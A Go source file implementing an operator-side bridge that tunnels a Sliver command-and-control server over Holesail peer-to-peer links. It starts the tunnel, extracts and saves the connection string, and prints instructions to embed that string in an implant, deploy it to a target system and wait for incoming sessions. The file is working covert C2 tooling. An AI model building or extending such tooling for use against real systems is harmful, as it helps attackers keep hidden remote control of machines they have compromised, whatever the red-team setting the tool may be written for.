package bridge

import (
	"bufio"
	"fmt"
	"io"
	"net"
	"os"
	"os/exec"
	"os/signal"
	"path/filepath"
	"regexp"
	"syscall"
	"time"
)

// Config holds the bridge configuration
type Config struct {
	SliverPort           int
	Secure               bool
	LogDir               string
	ConnectionStringFile string
}

// Bridge manages the Holesail-Sliver integration
type Bridge struct {
	config           Config
	logger           *Logger
	holesailCmd      *exec.Cmd
	connectionString string
	isRunning        bool
}

// NewBridge creates a new bridge instance
func NewBridge(config Config) (*Bridge, error) {
	logger, err := NewLogger(config.LogDir)
	if err != nil {
		return nil, fmt.Errorf("failed to create logger: %w", err)
	}

	return &Bridge{
		config: config,
		logger: logger,
	}, nil
}

// CheckSliverServer verifies that Sliver server is accessible
func (b *Bridge) CheckSliverServer() bool {
	b.logger.Info("Checking Sliver server availability", map[string]interface{}{
		"port": b.config.SliverPort,
	})

	address := fmt.Sprintf("127.0.0.1:%d", b.config.SliverPort)
	conn, err := net.DialTimeout("tcp", address, 3*time.Second)
	if err != nil {
		b.logger.Error("Cannot connect to Sliver server", map[string]interface{}{
			"port":  b.config.SliverPort,
			"error": err.Error(),
		})
		return false
	}

	conn.Close()
	b.logger.Success("Sliver server is accessible", nil)
	return true
}

// StartHolesailBridge starts the Holesail process and extracts connection string
func (b *Bridge) StartHolesailBridge() (string, error) {
	b.logger.Info("Starting Holesail bridge", map[string]interface{}{
		"port":   b.config.SliverPort,
		"secure": b.config.Secure,
	})

	// Build holesail command
	args := []string{"--live", fmt.Sprintf("%d", b.config.SliverPort)}
	if b.config.Secure {
		args = append(args, "--secure")
	}

	b.holesailCmd = exec.Command("holesail", args...)

	// Create pipes for stdout and stderr
	stdout, err := b.holesailCmd.StdoutPipe()
	if err != nil {
		return "", fmt.Errorf("failed to create stdout pipe: %w", err)
	}

	stderr, err := b.holesailCmd.StderrPipe()
	if err != nil {
		return "", fmt.Errorf("failed to create stderr pipe: %w", err)
	}

	// Start the command
	if err := b.holesailCmd.Start(); err != nil {
		return "", fmt.Errorf("failed to start holesail: %w", err)
	}

	b.isRunning = true

	// Channel to receive connection string
	connStringChan := make(chan string, 1)
	errChan := make(chan error, 1)

	// Parse stdout for connection string
	go b.parseHolesailOutput(stdout, connStringChan, errChan)

	// Log stderr
	go b.logHolesailStderr(stderr)

	// Wait for connection string or timeout
	select {
	case connStr := <-connStringChan:
		b.connectionString = connStr
		b.logger.Success("Connection string extracted", map[string]interface{}{
			"connectionString": connStr,
		})
		return connStr, nil

	case err := <-errChan:
		return "", err

	case <-time.After(15 * time.Second):
		return "", fmt.Errorf("timeout waiting for connection string")
	}
}

// parseHolesailOutput extracts the connection string from holesail output
func (b *Bridge) parseHolesailOutput(reader io.Reader, connStringChan chan<- string, errChan chan<- error) {
	scanner := bufio.NewScanner(reader)
	connStringRegex := regexp.MustCompile(`(hs://[a-zA-Z0-9]+)`)
	found := false

	for scanner.Scan() {
		line := scanner.Text()
		fmt.Println(line) // Also print to console

		if !found {
			matches := connStringRegex.FindStringSubmatch(line)
			if len(matches) > 0 {
				connStringChan <- matches[1]
				found = true
			}
		}
	}

	if err := scanner.Err(); err != nil {
		errChan <- fmt.Errorf("error reading holesail output: %w", err)
	}
}

// logHolesailStderr logs stderr output from holesail
func (b *Bridge) logHolesailStderr(reader io.Reader) {
	scanner := bufio.NewScanner(reader)
	for scanner.Scan() {
		line := scanner.Text()
		b.logger.Warn("Holesail stderr", map[string]interface{}{
			"message": line,
		})
	}
}

// SaveConnectionString saves the connection string to a file
func (b *Bridge) SaveConnectionString() error {
	content := fmt.Sprintf(`Holesail-Sliver Connection String
Generated: %s
Port: %d
Secure: %t

Connection String:
%s

Usage (implant side):
holesail %s

SECURITY NOTICE:
This connection string is a sensitive credential.
Anyone with this string can connect to your C2 server.
Store securely and rotate regularly.
`,
		time.Now().Format(time.RFC3339),
		b.config.SliverPort,
		b.config.Secure,
		b.connectionString,
		b.connectionString,
	)

	// Ensure directory exists
	dir := filepath.Dir(b.config.ConnectionStringFile)
	if err := os.MkdirAll(dir, 0755); err != nil {
		return fmt.Errorf("failed to create directory: %w", err)
	}

	// Write file with restricted permissions
	if err := os.WriteFile(b.config.ConnectionStringFile, []byte(content), 0600); err != nil {
		return fmt.Errorf("failed to write connection string file: %w", err)
	}

	b.logger.Success("Connection string saved to file", map[string]interface{}{
		"file": b.config.ConnectionStringFile,
	})

	return nil
}

// DisplayInfo prints bridge status and instructions
func (b *Bridge) DisplayInfo() {
	banner := `
======================================================================
  HOLESAIL-SLIVER BRIDGE - OPERATOR SIDE
======================================================================

Status:           RUNNING
Sliver Port:      %d
Secure Mode:      %s
Log Directory:    %s

CONNECTION STRING:
%s

NEXT STEPS:
1. Copy the connection string above
2. Embed it in your implant configuration
3. Deploy the implant to target system
4. Monitor your Sliver console for incoming sessions

IMPLANT COMMAND:
holesail %s

This will expose port 13337 locally on the implant machine.
Configure your Sliver implant to connect to: 127.0.0.1:13337

SECURITY REMINDERS:
- Treat connection string as a password
- Use --secure mode in production
- Rotate connection strings regularly
- Monitor logs for suspicious activity

Press Ctrl+C to stop the bridge

======================================================================
`

	secureMode := "NO (Insecure)"
	if b.config.Secure {
		secureMode = "YES (Recommended)"
	}

	fmt.Printf(banner,
		b.config.SliverPort,
		secureMode,
		b.config.LogDir,
		b.connectionString,
		b.connectionString,
	)
}

// Shutdown gracefully stops the bridge
func (b *Bridge) Shutdown() error {
	b.logger.Info("Shutting down bridge", nil)

	if b.holesailCmd != nil && b.holesailCmd.Process != nil {
		// Send SIGTERM
		if err := b.holesailCmd.Process.Signal(syscall.SIGTERM); err != nil {
			b.logger.Error("Failed to send SIGTERM", map[string]interface{}{
				"error": err.Error(),
			})
			// Force kill
			b.holesailCmd.Process.Kill()
		} else {
			// Wait for graceful shutdown
			done := make(chan error)
			go func() {
				done <- b.holesailCmd.Wait()
			}()

			select {
			case <-done:
				b.logger.Success("Holesail process terminated gracefully", nil)
			case <-time.After(5 * time.Second):
				b.logger.Warn("Timeout waiting for graceful shutdown, forcing kill", nil)
				b.holesailCmd.Process.Kill()
			}
		}
	}

	b.isRunning = false
	b.logger.Info("Bridge shutdown complete", nil)
	return nil
}

// Start runs the complete bridge lifecycle
func (b *Bridge) Start() error {
	// Setup signal handling
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, os.Interrupt, syscall.SIGTERM)

	go func() {
		<-sigChan
		fmt.Println("\n\nReceived shutdown signal, stopping gracefully...")
		b.Shutdown()
		os.Exit(0)
	}()

	// Check Sliver availability
	if !b.CheckSliverServer() {
		fmt.Fprintf(os.Stderr, "\n❌ ERROR: Cannot connect to Sliver server\n")
		fmt.Fprintf(os.Stderr, "Please ensure Sliver is running on port %d\n\n", b.config.SliverPort)
		fmt.Fprintf(os.Stderr, "To start Sliver:\n")
		fmt.Fprintf(os.Stderr, "  1. Run: sliver-server\n")
		fmt.Fprintf(os.Stderr, "  2. In Sliver console: mtls --lport %d\n", b.config.SliverPort)
		fmt.Fprintf(os.Stderr, "  3. Re-run this bridge\n\n")
		return fmt.Errorf("sliver server not available")
	}

	// Start Holesail bridge
	connString, err := b.StartHolesailBridge()
	if err != nil {
		return fmt.Errorf("failed to start holesail bridge: %w", err)
	}

	b.connectionString = connString

	// Save connection string
	if err := b.SaveConnectionString(); err != nil {
		b.logger.Error("Failed to save connection string", map[string]interface{}{
			"error": err.Error(),
		})
		// Non-fatal, continue
	}

	// Display information
	b.DisplayInfo()

	// Wait for process to exit
	if err := b.holesailCmd.Wait(); err != nil {
		b.logger.Error("Holesail process exited with error", map[string]interface{}{
			"error": err.Error(),
		})
		return err
	}

	return nil
}
